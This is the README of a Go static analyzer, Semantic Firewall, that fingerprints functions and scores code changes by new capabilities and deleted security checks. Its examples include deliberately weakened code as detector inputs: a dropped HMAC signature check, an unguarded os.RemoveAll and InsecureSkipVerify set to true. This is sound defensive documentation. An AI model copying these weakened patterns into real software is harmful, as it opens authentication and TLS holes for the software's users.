# Semantic Firewall

[![Go Reference](https://pkg.go.dev/badge/github.com/BlackVectorOps/semantic_firewall/v7.svg)](https://pkg.go.dev/github.com/BlackVectorOps/semantic_firewall/v7)
[![License: MIT](https://img.shields.io/badge/License-MIT-00d4aa.svg)](LICENSE)
[![Marketplace](https://img.shields.io/badge/Marketplace-Semantic_Firewall-7c3aed.svg)](https://github.com/marketplace/actions/semantic-firewall)
[![Semantic Check](https://github.com/BlackVectorOps/semantic_firewall/actions/workflows/semantic_analysis.yml/badge.svg)](https://github.com/BlackVectorOps/semantic_firewall/actions/workflows/semantic_analysis.yml)

`sfw` is a static analyzer for Go source. It builds SSA with `golang.org/x/tools/go/ssa`, rewrites each function into a canonical IR, and fingerprints the function as the SHA-256 of that IR. On top of the fingerprint:

- `sfw diff` compares two files function by function. It matches renamed functions by topology and scores each change by the capabilities it newly reaches and the guards, checks and security settings it removes.
- `sfw deps diff` compares the third-party code two trees of a module compile in: changed functions, exported functions that newly reach a capability, and changed files the analysis cannot see.
- `sfw audit` sends a diff's high-risk changes, their source and the commit message to an LLM, which reads the code (through tools, with a Claude model) and decides whether the message describes the change.
- `sfw index` and `sfw scan` match function topologies against a signature store (PebbleDB or JSON).

The analysis never executes the code under test.

> [!CAUTION]
> This tool is provided for defensive security research and authorized testing only. Do not use it to create, distribute, or deploy malware. Users are responsible for compliance with applicable laws and organizational policies. The author assumes no liability for misuse.

## Contents

- [Install](#install)
- [Commands](#commands)
- [sfw check](#sfw-check)
- [sfw diff](#sfw-diff)
- [Risk scoring](#risk-scoring)
- [Detection scope](#detection-scope)
- [sfw deps diff](#sfw-deps-diff)
- [sfw audit](#sfw-audit)
- [sfw index and sfw scan](#sfw-index-and-sfw-scan)
- [Signature store](#signature-store)
- [Fingerprint pipeline](#fingerprint-pipeline)
- [Semantic Zipper](#semantic-zipper)
- [Function topology](#function-topology)
- [Entropy and obfuscation](#entropy-and-obfuscation)
- [Sandbox](#sandbox)
- [GitHub Action](#github-action)
- [Library usage](#library-usage)
- [Development](#development)

## Install

```bash
go install github.com/BlackVectorOps/semantic_firewall/v7/cmd/sfw@v7.3.0
```

`go.mod` declares `go 1.27.2`. `sfw version` prints the build:

```
Semantic Firewall CLI
Build: v7.3.0 (Pebble/Gob+PackedIdx)
```

## Commands

Flags must come before positional arguments. The CLI parses each command with Go's `flag` package, which stops at the first non-flag argument; flags placed after a file name are silently ignored.

| Command | Flags (default) | Arguments | Sandboxed |
|---------|-----------------|-----------|-----------|
| `check` | `--strict` (false), `--scan` (false), `--db` (""), `--no-sandbox` (false) | `<file.go\|dir>` | yes |
| `diff` | `--no-sandbox` (false), `--batch` ("") | `<old.go> <new.go>`, or none with `--batch <pairs-file>` | yes |
| `deps diff` | `--no-sandbox` (false) | `<old-module-dir> <new-module-dir>` | yes |
| `audit` | `--model` (`claude-opus-5-5`), `--api-key` (""), `--api-base` (""), `--no-sandbox` (false) | `<old.go> <new.go> "<commit message>"` | yes (the diff step) |
| `index` | `--name` (required), `--severity` (`HIGH`), `--category` (`malware`), `--db` ("") | `<file.go\|dir>` | no |
| `scan` | `--db` (""), `--threshold` (0.75), `--exact` (false), `--deps` (false), `--deps-depth` (`direct`), `--no-sandbox` (false) | `<file.go\|dir>` | yes |
| `migrate` | `--from` (required), `--to` (required) | none | no |
| `stats` | `--db` ("") | none | no |
| `version` | none | none | no |

`sfw <command> -h` lists a command's flags. `--severity` is stored as given, without validation. Any `--deps-depth` value other than `transitive` is treated as `direct`.

Exit codes:

| Command | Exit 0 | Exit 1 |
|---------|--------|--------|
| `check` | analysis ran, even when a file failed to load (reported in that file's `error` field) | `--strict` and any file errored; fatal errors |
| `diff` | diff produced, regardless of risk | fatal errors |
| `diff --batch` | every pair diffed, regardless of risk | any pair failed (after printing all results); fatal errors |
| `deps diff` | diff produced, regardless of risk | either tree failed to load; fatal errors |
| `scan` | scan ran, regardless of alerts | fatal errors (e.g. no database) |
| `audit` | verdict `MATCH` | verdict `LIE`, `SUSPICIOUS` or `ERROR` |

`diff` treats a missing input file as an empty file.

## sfw check

Prints a JSON array with one entry per file. A directory is walked recursively, skipping `vendor/`, hidden directories and `_test.go` files. Function names are package-qualified: a file loaded on its own belongs to `command-line-arguments`.

```bash
sfw check --no-sandbox new.go
```

```json
[
  {
    "file": "new.go",
    "functions": [
      { "function": "command-line-arguments.Handle",   "fingerprint": "4acdccda3895dd4cec3af2d55ad43489f91860cd226f82091eaf0a2429849e2f", "file": "/work/new.go", "line": 5 },
      { "function": "command-line-arguments.Handle$1", "fingerprint": "1777c5c3ae9a69e395f6bbe8f35a1e447d25534afec7bb907eacf873e7d4917c", "file": "/work/new.go", "line": 7 },
      { "function": "command-line-arguments.Sum",      "fingerprint": "7cc1efa6ef6ca643863de5dcb0a68f7c80cd6dae8c530697706f40ce737030ae", "file": "/work/new.go", "line": 10 },
      { "function": "command-line-arguments.init",     "fingerprint": "825a2d206f4eb4ea4413c050e4ca9e4b8e439c2067219829a8fef891031a1850", "file": "" }
    ]
  }
]
```

The output above was captured from a real run, with the absolute path shortened to `/work` and each object put on one line. `new.go` is the file in the [`sfw diff`](#sfw-diff) example.

- **`--strict`:** an unhandled SSA instruction makes the canonicalizer fail instead of emitting `UnhandledInstr<T>`, and any per-file error makes the command exit 1.
- **`--scan`:** each function's topology is also matched against the signature database (`--db`, or the [default resolution](#database-path-resolution)) at a fixed threshold of 0.75. The matches go in a `scan_results` field. A missing database is a fatal error.

## sfw diff

Input:

```go
// old.go
package p

import "fmt"

func Handle(cmd string) { fmt.Println(cmd) }

func Add(a, b int) int { return a + b }
```

```go
// new.go
package p

import "net"

func Handle(cmd string) {
	net.Dial("tcp", cmd)
	go func() {}()
}

func Sum(a, b int) int { return a + b }
```

`sfw diff --no-sandbox old.go new.go` prints the following. This is the full output, except that the `init` entry is abbreviated to its status and delta.

```json
{
  "old_file": "old.go",
  "new_file": "new.go",
  "summary": {
    "total_functions": 4,
    "preserved": 0,
    "modified": 3,
    "added": 1,
    "removed": 0,
    "semantic_match_pct": 0,
    "topology_matched_pct": 75,
    "renamed_functions": 1,
    "high_risk_changes": 1
  },
  "functions": [
    {
      "function": "Handle",
      "status": "modified",
      "fingerprint_match": false,
      "old_fingerprint": "f735eacc97909969c02c6c115696e44282599242dfb7ebc5f8450894210caecf",
      "new_fingerprint": "4acdccda3895dd4cec3af2d55ad43489f91860cd226f82091eaf0a2429849e2f",
      "matched_nodes": 1,
      "added_ops": ["go Handle$1()", "t0 = net.Dial(\"tcp\":string, cmd)"],
      "removed_ops": ["*t1 = t2", "t0 = new [1]any (varargs)", "t1 = &t0[0:int]", "t2 = make any <- string (cmd)", "t3 = slice t0[:]", "t4 = fmt.Println(t3...)"],
      "risk_score": 30,
      "topology_delta": "Capability+network(net.Dial), Calls-1, AddedGoroutine, StringLiterals~, Entropy+1.6"
    },
    {
      "function": "init",
      "status": "modified",
      "...": "...",
      "topology_delta": "NoStructuralChange"
    },
    {
      "function": "Add → Sum",
      "status": "renamed",
      "fingerprint_match": true,
      "old_fingerprint": "7cc1efa6ef6ca643863de5dcb0a68f7c80cd6dae8c530697706f40ce737030ae",
      "new_fingerprint": "7cc1efa6ef6ca643863de5dcb0a68f7c80cd6dae8c530697706f40ce737030ae"
    },
    {
      "function": "Handle$1",
      "status": "added",
      "fingerprint_match": false,
      "new_fingerprint": "1777c5c3ae9a69e395f6bbe8f35a1e447d25534afec7bb907eacf873e7d4917c",
      "risk_score": 5,
      "topology_delta": "NewFunction"
    }
  ],
  "topology_matches": [
    { "old_function": "Handle", "new_function": "Handle", "similarity": 0.7048387096774194, "matched_by_name": true,  "old_topology": "L0B0I7[fmt.Println]", "new_topology": "L0B0I3[go:closure:func(),net.Dial]" },
    { "old_function": "init",   "new_function": "init",   "similarity": 0.7419354838709677, "matched_by_name": true,  "old_topology": "L0B1I6[fmt.init]",    "new_topology": "L0B1I6[net.init]" },
    { "old_function": "Add",    "new_function": "Sum",    "similarity": 1,                  "matched_by_name": false, "old_topology": "L0B0I2[]",            "new_topology": "L0B0I2[]" }
  ]
}
```

`Handle` scores 30: +20 because it newly reaches the network capability, and +10 for the new goroutine. `added_ops` and `removed_ops` are SSA instructions in `go/ssa` text form. A `*_topology` string is `L<loops>B<branches>I<instructions>[<call signatures>]`. The call signatures are sorted; when there are more than three, only the first three appear, followed by `...(<total>)`.

### Status

| Status | Meaning |
|--------|---------|
| `preserved` | Matched by name. The default fingerprints are equal, the keep-all-literals fingerprints are equal, and no capability was newly reached. |
| `modified` | Matched by name, otherwise |
| `renamed` | Matched by topology, not by name. It is counted in `modified`. |
| `added` | Only in the new file. Scored as a new function with a base of 5; a capability call moved into it from its callers is not charged (see [Risk scoring](#risk-scoring)). |
| `removed` | Only in the old file. Scored 0, except that a function containing a verification call scores 10 (`RemovedCheck(...)`). |

The `preserved` test compares fingerprints under two literal policies. The default policy masks strings and integers outside [-16, 16], so its fingerprint survives a changed literal; the keep-all policy does not. A changed URL, command, limit or file mode therefore produces `modified`, with the literal in `added_ops`/`removed_ops`.

Only the fingerprints decide the status. The [Zipper](#semantic-zipper) aligns instructions by data flow, so it pairs every instruction of a swapped `if`/`else`, a negated condition or a call moved out of its guard. Such a change is `modified`, and the Zipper lists the moved instructions and the changed branch in both `added_ops` and `removed_ops`.

The summary fields:
- `semantic_match_pct` = preserved / total × 100.
- `topology_matched_pct` = matched pairs / total × 100.
- `topology_matched_pct`, `renamed_functions` and `high_risk_changes` are omitted when zero.

The package `init` function is diffed like any other. Swapping an import changes it (`fmt.init` → `net.init` above), but that change scores 0.

### Files

The diff reports the functions declared in the given file, closures and [body-less functions](#body-less-functions) included, plus the package's synthesized `init`. That function has no source file and runs every file's package-level initializers. The package's other files are loaded for type-checking but their functions are not reported. A function belongs to the file it is written in: a `//line` directive changes the position the compiler reports, not which file's diff the function is in.

A file that the host build excludes is loaded under a configuration that includes it, chosen before the file is loaded:
- **`_test.go` file:** loaded with the package's tests.
- **`_GOOS`/`_GOARCH` name suffix or `//go:build` line:** `go/build` matches the file against GOOS/GOARCH pairs, the host's first and then a fixed list of 27 (`knownPlatforms` in `pkg/diff/fingerprinter.go`). For each pair it tries every subset of the line's custom tags, at most 4. Platform names, `unix`, `cgo`, `gc`, `gccgo`, `ignore`, `go1.*` and `goexperiment.*` do not count as custom tags (`ignore` is never supplied: the standard library's generators carry it, and a build with it set fails). The first match is loaded, with cgo disabled. The configuration is chosen up front because `go list`, asked for a file that is the only Go file of its directory, does not report it excluded: it builds an ad-hoc package of the file under the host's GOOS and GOARCH, where the platform's API is undefined and the sizes are the host's.
- A file that no combination matches (a `//go:build ignore` script beside a package's files) is loaded alone, as `go build file.go` builds it: an ad-hoc package of the one file under the host's GOOS and GOARCH, its constraints ignored.

A module with a `vendor` directory is loaded from it, as the go command builds it (a `go.mod` of go 1.14 or later; in a workspace, the workspace's `vendor` directory with a `go.work` of go 1.22 or later), whatever the module cache holds. Every mode of `sfw` applies this rule (`diff.VendorDir`).

Reported names are relative to the function's own package: `F`, `(*T).M`, `F$1`. A package whose last path element contains a dot (`gopkg.in/yaml.v3`) is stripped completely.

### Function matching

`pkg/diff/topology_match.go` pairs the functions of the two files in three steps:

1. Functions with the same short name are paired. No similarity threshold applies. Type parameters are compared by position, so `(*List[T]).Push` pairs with `(*List[E]).Push`.
2. Closures are named by creation order (`F$1`, `F$2`), which shifts when a closure is inserted. They are therefore paired by content within their enclosing function, not by name. The passes run in this order:
   1. equal keep-all-literals fingerprints;
   2. equal default fingerprints;
   3. `TopologySimilarity` of at least 0.6, best first;
   4. equal names.
   A pair whose names differ is reported as `F$1 → F$2` and keeps its own status; it is not `renamed`.

   Declared `init` functions are paired the same way, together with their closures: `go/ssa` numbers them (`init#1`, `init#2`) across the package's files, so another file's new `init` renumbers them.
3. The remaining functions are paired only if their fuzzy hashes are identical and their `TopologySimilarity` is at least 0.6 (`DefaultTopologyMatchThreshold`). Pairs are assigned greedily, highest similarity first.

Unpaired functions are reported as `added` or `removed`. Because the fuzzy hash must match exactly, a rename combined with one added `if` changes the `BR` bucket and is reported as remove + add, even at similarity 0.92.

The pair below was produced by the code shown. The fingerprints differ, because a range loop and an index loop produce different SSA, but the topologies are identical:

```
┌──────────────────────────────────────────┬─────────────────────────────────┐
│ old.go                                   │ ExtractTopology, both functions │
│ func processData(input []byte) error {   │ ParamCount     1                │
│     conn, _ := net.Dial("tcp", addr)     │ ReturnCount    1                │
│     for _, b := range input {            │ BlockCount     4                │
│         conn.Write([]byte{b})            │ InstrCount     20               │
│     }                                    │ LoopCount      1                │
│     return conn.Close()                  │ BranchCount    1                │
│ }                                        │ PhiCount       1                │
├──────────────────────────────────────────┤ FuzzyHash      B2L1BR1P1R1      │
│ new.go                                   │ EntropyScore   1.585 (LOW)      │
│ func handleInput(data []byte) error {    │ CallSignatures                  │
│     c, _ := net.Dial("tcp", server)      │   builtin:len             1     │
│     for i := 0; i < len(data); i++ {     │   invoke:net.Conn.Close   1     │
│         c.Write([]byte{data[i]})         │   invoke:net.Conn.Write   1     │
│     }                                    │   net.Dial                1     │
│     return c.Close()                     │ Capabilities                    │
│ }                                        │   net.Dial -> network           │
├──────────────────────────────────────────┴─────────────────────────────────┤
│ fingerprints differ: 78f0dd2a39b3aafd... vs 950dce51df3f50b2...            │
│ FuzzyHash equal, TopologySimilarity = 1.0 >= 0.6  =>  status "renamed"     │
└────────────────────────────────────────────────────────────────────────────┘
```

### Batch mode

`sfw diff --batch <pairs-file>` diffs many files in one run. The pairs file holds NUL-terminated paths, alternately the old and the new version of each file (`old1\0new1\0old2\0new2\0`). An empty path or `/dev/null` stands for the absent side of an added or deleted file.

The output is a JSON array with one `sfw diff` result per pair, in order. A pair that cannot be diffed (a file that does not parse, say) has an `error` field and an empty `functions` list. The command prints every result, then exits 1 with `Error: 1 of 3 file pair(s) could not be diffed` on stderr.

Each result equals what `sfw diff` prints for that pair alone. The difference is loading: the files of one side that share a module root (the nearest `go.mod`) and the `go.work` that governs them are loaded with one `go/packages` call, so a package and its imports are type-checked once however many of its files changed. A file outside any module, a file the module's default build excludes (see [Files](#files)), a file in a package that does not type-check, and every file of a group whose load fails are loaded on their own, as `sfw diff` loads them. The old and new sides load concurrently.

## Risk scoring

`pkg/api/risk.go` scores each `modified`, `renamed` and `added` function. A change is high-risk at a score of 10 (`RiskScoreHigh`) or more; `high_risk_changes` counts such changes, and `sfw audit` sends exactly those to the LLM.

```
score = min(base + structural, 9) + escalation        base = 5 for an added function, else 0
```

**Escalations** are uncapped. A call target is *new* if the old version of the function did not call it.

| Change | Points |
|--------|--------|
| First new target in a capability class the function did not reach before: `exec` | 30 |
| ... `syscall` | 25 |
| ... `plugin` | 25 |
| ... `network` | 20 |
| ... `reflection` | 15 |
| ... `filesystem` | 10 |
| Each further new target in a class (a newly reached class or one already reached) | 5 |
| New goroutine (`go` statement where there was none) | 10 |
| String-literal entropy class rises into HIGH or PACKED | 10 |
| Obfuscation class rises to MODERATE or HIGH | 10 |
| A verification call or check helper present in the old version is gone (`RemovedCheck`) | 10 |
| A capability call whose old call sites all ran under a condition now runs unconditionally, or might (`Unguarded`, `GuardsUnknown`) | 10 |
| A security setting that weakens on its own appears, or one whose removal weakens disappears (`WeakenedSecurity`) | 10 |

The +5 row does not reach the threshold on its own: adding `net.Listen` to a function that already called `net.Dial` scores 5.

**Moved capabilities:** extracting a capability call from an existing function into a new helper adds no capability. An added function's target is labelled `MovedCapability(target<-Caller)` and charged nothing when all of these hold, and is scored as new otherwise:
- the helper is a package-level, unexported, non-generic function: not a method (callable through an interface), a closure (callable through a func value) or an `init`;
- every reference to it in its package is a direct call, so no value of it escapes;
- each caller is a matched function whose old version called the target directly and whose new version does not;
- when the old call ran under a condition, the new caller's calls to the helper, or the helper's own call, still do (`topology.CallGuards` counts the first as `CapabilityGuards` counts the second).

A moved target's class counts as one the helper already reached, so another new target in that class adds 5, as it would in the caller. Moving a guarded `exec.Command` into a helper that runs it unconditionally still scores 30, and so does a helper with a new caller that never made the call. The helper and its callers must be in the same file pair: a helper moved to another file is scored as new, because each file pair is diffed on its own. Diffs of dependencies (`sfw deps diff`) do not apply this rule.

**Structural churn** is capped, together with the base, at 9, so churn alone never reaches the threshold:

| Change | Points |
|--------|--------|
| New call target outside the capability classes | 2 each |
| New loop | 5 each |
| New branch | 1 each |
| New `defer` | 2 |
| New `panic` | 3 |

Removed calls, loops, branches and error exits are labelled (`Calls-1`, `Loops-1`, `Branches-1`, `ErrorExits-1`) but score nothing. An entropy increase greater than 1.0 is labelled `Entropy+x.x` without points. A changed string-literal list is labelled `StringLiterals~`.

### Deletion signals

A change can make code more dangerous by removing something. Four signals look for that. In the example below, the new version drops a signature check, an authorization test and a TLS setting:

```go
// old.go                                         // new.go (validSignature unchanged)
func validSignature(msg, sig, key []byte) bool {
	m := hmac.New(sha256.New, key)
	m.Write(msg)
	return hmac.Equal(sig, m.Sum(nil))
}

func Accept(msg, sig, key []byte) error {         func Accept(msg, sig, key []byte) error {
	if !validSignature(msg, sig, key) {               return nil
		return errors.New("bad signature")        }
	}
	return nil
}

func Purge(user, dir string) error {              func Purge(user, dir string) error {
	if user != "admin" {                              return os.RemoveAll(dir)
		return errors.New("forbidden")            }
	}
	return os.RemoveAll(dir)
}

func Client() *tls.Config {                       func Client() *tls.Config {
	return &tls.Config{MinVersion: tls.VersionTLS12}  return &tls.Config{MinVersion: tls.VersionTLS12, InsecureSkipVerify: true}
}                                                 }
```

`sfw diff` scores each of the three at 10:

| Function | `topology_delta` |
|----------|------------------|
| `Accept` | `RemovedCheck(command-line-arguments.validSignature,crypto/hmac.Equal), Calls-2, ErrorExits-1, Branches-1, StringLiterals~` |
| `Purge` | `Unguarded(os.RemoveAll), Calls-1, ErrorExits-1, Branches-1, StringLiterals~` |
| `Client` | `WeakenedSecurity(crypto/tls.Config.InsecureSkipVerify=true)` |

**`RemovedCheck`:** a key of the old function's `Checks` is missing from the new one's. `Checks` holds the calls that verify something:
- the verification primitives listed under [Capability classes](#capability-classes), when the result decides a branch or is returned;
- *check helpers:* static calls to a function of the same package that calls a primitive, and decides on its result, through at most 3 levels of static calls within that package (`validSignature` above), when the result decides a branch or is returned, or the helper has no result (it panics or exits on failure). The primitives the helper reaches are recorded with it, so moving a check into a helper is not a removal;
- calls whose name contains a word that starts with `auth`, `verif`, `valid`, `permi`, `allow`, `admin`, `acl`, `csrf`, `xsrf`, `signature`, `privilege`, `owner`, `role` or `access` (`authorize`, `isAdmin`, `checkPermission`; words split at camelCase and `_`), when the result decides a branch or is returned as a `bool` or `error`; getters that return other values do not count, nor do `os.IsPermission` and `reflect.Value.IsValid`, nor names with a word that fetches, builds or changes state (`get`, `set`, `unset`, `build`, `rebuild`, `load`, `list`, `find`, `new`, `create`, `add`, `delete`, `remove`, `update`, `save`, `register` and the like: `GetRoles`, `BuildRoleLinks`, `DeleteExternalAuths`). Interface methods count (`(example.com/p.Verifier).Verify`). When such a call is to a function of the same package, the checks that function makes, up to 3 calls deep, count as the caller's too, so moving checks into a `validateHeaders` helper is not a removal.

A call whose result is ignored checks nothing. Results kept in locals, as in a function with a `defer`, are followed to their use, and so are results tested by `errors.Is` or `errors.As`: `errors.Is(validate(u), ErrBad)` decides like `validate(u) == ErrBad`.

A check that reappears in the new version under the same name with only the case of its first letter changed (an exported rename, `validator` → `Validator`) is the same check, and so is `subtle.ConstantTimeCompare` in place of `hmac.Equal`, or the reverse: `hmac.Equal` is `ConstantTimeCompare` on inputs of equal length, and `ConstantTimeCompare` fails inputs of unequal length. One that reappears under the same name in a package whose path ends in the same name, ignoring major versions (`casbin/v2` → `casbin/v3`, a fork such as `go-ozzo/ozzo-validation` → `pocketbase/ozzo-validation`, `gopkg.in/square/go-jose.v2` → `github.com/go-jose/go-jose/v3`), is labelled `ReplacedCheck(old->new)` without points: the code still checks, through an implementation the reviewer should see. A verification primitive never matches a look-alike: a function of another package named `Equal` is no `hmac.Equal`.

A function literal invoked on the spot is part of the function: its checks count as the function's when it has no result or its result decides, as for a check helper. They are its own too, so a check removed there is reported on both. A literal passed to a call, such as `singleflight.Group.Do`, runs when the callee chooses, and a cache may skip it. Its checks are recorded apart, keyed to the callee, when the call's `error` result decides a branch or is returned, and a check that moved into one is labelled `MovedCheck(check via callee)` without points: the reviewer should see it, but a refactor is not a removal. The literal must have no other use, passed directly or as a named func type. One that is also stored, passed as `any`, deferred or run with `go` counts for nothing, and so does a branch on another result, such as `Do`'s `shared` flag. Literals inside literals follow the same rules at each level. Named functions and method values passed as callbacks are not followed, nor is `errgroup.Group.Go`, whose error arrives through `Wait`.

A name-based check that moved from a function into a helper of the same package with another name, such as `processFlight` or `validWritePath`, is labelled `CheckMovedIntoHelper(check via helper)` without points, apart from `MovedCheck` so the two can be told apart. The helper counts when the function's call to it is a name-based check itself, has a `bool` or `error` result, or a last result of a type that implements `error` (`*ValidationError`, also once converted to `error`), that decides a branch or is returned, or has no result and a name with a verification word (`mustVerify`, which panics or exits on failure). Its checks are followed through calls that count the same way, up to 3 functions deep within its package. A branch on another result, such as a returned `*Alert`, does not count, nor does a call to a helper with no result and another name: a logger can branch on a check without enforcing it. These checks only explain a removal and are not the function's own, so a change inside the helper or a deleted caller reports nothing new.

**`Unguarded`:** for each capability call target, `CapabilityGuards` records the fewest conditional branches any of its call sites is control-dependent on. A call site is control-dependent on a two-way branch when one outcome of the branch guarantees that the call runs and the other does not. Loop conditions are not guards, and neither is a branch on a constant (`if true`, `const skipAuth = true`): only the side it takes can run. A target called on every path through the function counts 0, even when each call sits under a branch (`if ok { call() } else { call() }`). Calls that do not return (`os.Exit`, `runtime.Goexit`, `log.Fatal*` and `log.Panic*` and their `*log.Logger` methods, `testing` `Fatal*`, `FailNow` and `Skip*`, and functions of the same package that always end in one of these) end the function like a return. In a function that never returns, such as a worker's `for {}` loop, each pass around the loop counts as a run of the function. `Unguarded` fires only when the old count was at least 1 and the new count is 0. A target the old version did not call fires too, at a count of 0, when every old call in its capability class had a count of at least 1: swapping a guarded `exec.Command` for an unguarded `os.StartProcess` deletes the same guard. The count is of direct dependences: in `if a { if b { call() } }` the call depends on `b` alone, and `if a || b { call() }` gives 2, so deleting one of several guards does not fire.

A function with more than 2000 blocks records no guards. When the new version is that large and the old one is not, each call that would have to be checked for `Unguarded` is reported as `GuardsUnknown(target)`, scored the same: growing a function must not hide a deleted guard.

**`WeakenedSecurity`:** constant stores to these fields, and one call:

| Weakens on its own (`WeakSettings`) | Weakens when removed (`SecureSettings`) |
|-------------------------------------|-----------------------------------------|
| `tls.Config.InsecureSkipVerify = true` | `tls.Config.ClientAuth = RequireAndVerifyClientCert` |
| `tls.Config.MinVersion` or `MaxVersion` below TLS 1.2 | `http.Cookie.Secure = true` |
| `http.Cookie.SameSite = SameSiteNoneMode` | `http.Cookie.HttpOnly = true` |
| a call to `ssh.InsecureIgnoreHostKey` (`golang.org/x/crypto/ssh`) | |

A new weak setting is reported as is; a lost secure setting carries a `-` prefix (`WeakenedSecurity(-net/http.Cookie.Secure=true)`). A non-constant value records nothing. The fields count also through a defined type (`type cfg tls.Config`) or an embedded struct, and `ssh.InsecureIgnoreHostKey` counts when taken as a value.

A secure setting holds only when no store in the function writes a weaker constant to the field (`c.Secure = false` after `Secure: true`) and every cookie or config the function allocates gets it, itself or from a helper it is passed to: a second cookie without `Secure` is not hidden by a first one with it. Settings made by helpers of the same package, up to 3 calls deep, count as the caller's, so moving a cookie's construction into a helper is not a removal. A weak TLS version bound that replaces a lower one on the same field (`MinVersion` from TLS 1.0 to 1.1) is not reported. While the lower bound remains, the new one is another config's and is reported: a second config lowered from TLS 1.2 to 1.1 next to a TLS 1.0 one weakens it.

**`ErrorExits-N`:** `ErrorExits` counts two-way branches with exactly one side that ends the function with a failure: a `panic`, a call that does not return, `http.Error`, `http.NotFound` or `WriteHeader` with a constant status of 400 or more, or the return of a failure error. A failure error is a new one (`errors.New`, `errors.Join`, `fmt.Errorf`, a concrete type converted to `error`), a package-level error variable, or the value the branch just tested as non-nil (`if err != nil { return err }`). A drop is labelled and not scored: error handling is often refactored away legitimately. Replaying the last 100 commits of ten repositories (776 that load), drops appeared in 34 commits, all ordinary refactors, and scoring them would have flagged 25 more.

### Capability classes

Call targets come from `*ssa.Function` callees and functions passed by name. Each is keyed by import path (`os/exec.Command`, `(net/http.Client).Do`) and classified by `topology.ClassifyCallTarget`. Capabilities a function reaches without naming them are call targets too: the methods of a value converted to a non-empty interface, or passed for a constrained type parameter, that the interface or constraint declares (an `exec.Cmd` run through `interface{ Run() error }` records `(os/exec.Cmd).Run`), and calls of `http.RoundTripper`'s `RoundTrip`. Only classified methods are recorded this way.

| Class | Members |
|-------|---------|
| `exec` | every function in `os/exec` except `LookPath`; `os.StartProcess`; `Exec`, `ForkExec` and `StartProcess` in `syscall`, `golang.org/x/sys/unix` and `golang.org/x/sys/windows`; `net/http/cgi.Handler.ServeHTTP`, which runs `Handler.Path` for every request |
| `syscall` | every other package-level function in `syscall`, `golang.org/x/sys/unix` and `golang.org/x/sys/windows` (methods excluded, and conversion helpers that make no system call: `BytePtrFromString`, `UTF16PtrFromString`, `NsecToTimespec`, `Getpagesize` and the like) |
| `plugin` | everything in `plugin` |
| `network` | `net` functions starting with `Dial`, `Listen`, `Lookup`, `Resolve` or `File`. `net/http` package-level functions and methods on `Client`, `Server`, `Transport` and the `RoundTripper` interface named `Get`, `Post`, `PostForm`, `Head`, `Do`, `RoundTrip`, `ListenAndServe`, `ListenAndServeTLS`, `Serve` or `ServeTLS`. Functions starting with `Dial` or `Listen`, plus `SendMail`, in `crypto/tls`, `net/rpc`, `net/rpc/jsonrpc`, `net/smtp`, `net/textproto` and `log/syslog`. `net/http/httptest.NewServer`, `NewTLSServer` and `NewUnstartedServer`. `net/http/httputil.ReverseProxy.ServeHTTP` |
| `reflection` | `reflect.Value.Call`, `CallSlice`, `MethodByName` and `Method` (the last two return a method the code can call as a func value) |
| `filesystem` | `os.WriteFile`, `Create`, `CreateTemp`, `OpenFile`, `Remove`, `RemoveAll`, `Rename`, `Chmod`, `Chown`, `Lchown`, `Chtimes`, `Truncate`, `Symlink`, `Link`, `Mkdir`, `MkdirAll` and `MkdirTemp`, as package-level functions or `os.Root` methods; `os.CopyFS`; `(*os.File).Chmod`, `Chown` and `Truncate`; `io/ioutil.WriteFile`, `TempFile` and `TempDir` |

Verification calls (`topology.IsVerificationCall`), whose removal is a `RemovedCheck`:
- `crypto/subtle.ConstantTimeCompare`, `ConstantTimeEq`, `ConstantTimeByteEq` and `ConstantTimeLessOrEq`; `crypto/hmac.Equal`
- `Verify*` in `crypto/ed25519`, `crypto/ecdsa` and `crypto/rsa`
- `x509.Certificate` / `CertificateRequest` `Verify*`, `CheckSignature`, `CheckSignatureFrom`
- `(*tls.Conn).VerifyHostname`
- `bcrypt.CompareHashAndPassword` (`golang.org/x/crypto/bcrypt`)
- `filepath.IsLocal`

Closures and range-over-func loop bodies are separate functions (`Handle$1`) and are scored on their own; a parent's capabilities do not include its closures' calls. Calls to imported packages' `init` functions are not call targets.

### Body-less functions

A function declared without a Go body (`func add(a, b int) int`) runs assembly from the package's `.s` files, or another function a [`//go:linkname` directive](#linkname-directives) names. Neither has SSA, so nothing in it is fingerprinted or scored. The diff reports each one by name instead:

| Change | Status | `topology_delta` | Points |
|--------|--------|------------------|--------|
| Declared in the new file only | `added` | `NoBody` | 10 |
| Parameter or result types changed | `modified` | `NoBody, Signature~` | 10 |
| Declared in the old file only | `removed` | `NoBody` | 0 |
| Otherwise (renamed parameters included) | `preserved` | | 0 |

The `.s` file itself is not read. `sfw deps diff` does not report a dependency's body-less functions. Its `unanalyzed` list reports added, modified and removed assembly files and linkname directives, so a body-less function added against unchanged assembly, or one whose signature changed, is not reported there.

### Linkname directives

A `//go:linkname local target` directive, or its `//go:linknamestd` spelling, which the compiler takes alike, makes `local`, a function or variable declared in any file of the package, the same symbol as `target`, usually another package's unexported function or variable. The analysis sees `local` only as its own package's. The diff compares the file's directives as text, normalized to single spaces, and lists each one added or removed under `unanalyzed`, whatever it names:

```json
"unanalyzed": [
  { "file": "new.go: //go:linkname x example.com/q.secret", "kind": "linkname", "change": "added", "risk_score": 10 }
]
```

An added directive scores 10 and counts in `high_risk_changes`, not in the function counts. A removed one scores 0 and is listed with the old file's path. A changed target is a removed directive and an added one, and a directive moved to another file of the package is added in that file. Text the compiler does not take as a directive, inside a block comment or with a tab after `//go:linkname`, is not reported.

## Detection scope

**Scored:**
- A function newly reaching one of the capability classes above through a concrete call target. This includes replacing one call with another while the call count stays the same (`fmt.Println` → `net.Dial` scores 20).
- `reflect.Value.Call`, `CallSlice`, `MethodByName` and `Method`, which are scored as the `reflection` capability.
- Removal of a verification call or a check helper, or deletion of a function that made one.
- A capability call left without any guard, and weakened security settings (see [Deletion signals](#deletion-signals)).
- New goroutines, entropy class increases and obfuscation class increases.
- An added or changed [body-less function](#body-less-functions), whose code is assembly or a linkname target, and an added [linkname directive](#linkname-directives).

**Not scored (no concrete target):**
- Interface method calls (`invoke:`), except those described under [Capability classes](#capability-classes): `http.RoundTripper.RoundTrip`, and capability methods of a value the function itself converts to the interface. A generic function on its own records nothing for the methods it calls on a type parameter; its callers do, through the type argument.
- Calls through function values (`dynamic:`), including func-typed fields such as `http.Transport.DialContext`.

These appear in `CallSignatures` but not in `CallTargets`, so they never reach the capability classifier.

**Not scored (other limits):**
- **Guards around ordinary code:** removing a condition (`if user != admin`, a bounds check) scores only when it leaves a capability call unconditional, removes a check, or weakens a listed setting. Otherwise it shows up as `Branches-N`, `ErrorExits-N` and changed literals in `removed_ops`, and scores 0. Deleting one of several guards of a capability call scores 0 as well.
